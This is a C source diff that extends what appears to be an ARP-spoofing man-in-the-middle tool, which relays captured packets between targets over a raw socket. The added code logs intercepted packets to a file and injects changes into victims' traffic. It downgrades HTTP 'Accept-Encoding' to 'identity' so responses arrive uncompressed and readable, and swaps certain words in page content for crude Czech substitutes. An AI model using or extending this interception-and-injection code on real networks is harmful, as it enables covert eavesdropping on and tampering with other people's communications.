@@ -3,6 +3,7 @@
 #include <string.h>
 #include <signal.h>
 #include <netinet/ether.h>
+#include <fcntl.h>
 
 #include "utils.h"
 #include "arp.h"
@@ -12,6 +13,7 @@
 #define BUF_SIZE ETH_FRAME_LEN
 
 int s; // socket
+int lfd; // log file descriptor, -1 of log disabled
 
 /*
  * this method looks at packet source eth address
@@ -87,9 +89,34 @@ processbuf(uint8_t * buf, size_t numbytes)
 	if(get_pkt_dir(ip_p) == PD_OTHER)
 		return;
 
-	// log and forward packet
-	printpktinfo(ip_p, numbytes);
-	logpacket(ip_p, numbytes);
+	/* write packet short info to STDOUT*/
+	//dprintpkt_s(1, ip_p, numbytes); 
+
+
+	/* inject packet */
+	char * arr[6];
+	arr[0] = "Accept-Encoding: gzip, deflate, sdch";
+	arr[1] = "Accept-Encoding: identity           ";
+	arr[2] = "Tome";
+	arr[3] = "vole";
+	arr[4] = "srpnovou";
+	arr[5] = "hovnovou";
+
+	int ic;
+	if(ic = injectpkt(ip_p, numbytes, arr, 6)){
+		//printf("INJECTED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
+		//dprintpkt_l(1, ip_p, numbytes);
+		//printf("%d\n", ic);
+		//printf("<%s>\n",arr[3]);
+	}
+
+
+
+	/* write packet long info into log file (log packet) */
+	if(lfd >= 0)
+		dprintpkt_l(lfd, ip_p, numbytes);
+
+	/* forward packet to other target */
 	forwardpacket(ip_p, numbytes);
 }
 
@@ -102,6 +129,7 @@ cleanup()
 {
   puts("Finishing up...");
   close(s);
+  close(lfd);
   exit(0);
 }
 
@@ -116,6 +144,18 @@ main(int argc, char ** argv)
   /* save arguments to proper global vars
    * and convert them to binary representation */
   process_args(argc, argv);
+
+  /* init log fd (lfd) */
+  if(argc >= 7){
+  	lfd = open(argv[6], O_RDWR|O_APPEND|O_CREAT);
+  	if(lfd < 0){
+  		perror("open");
+  		exit(1);
+  	}
+  } else {
+  	lfd = -1; /* disable logging */
+  }
+  
 
   // initialize socket
   s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
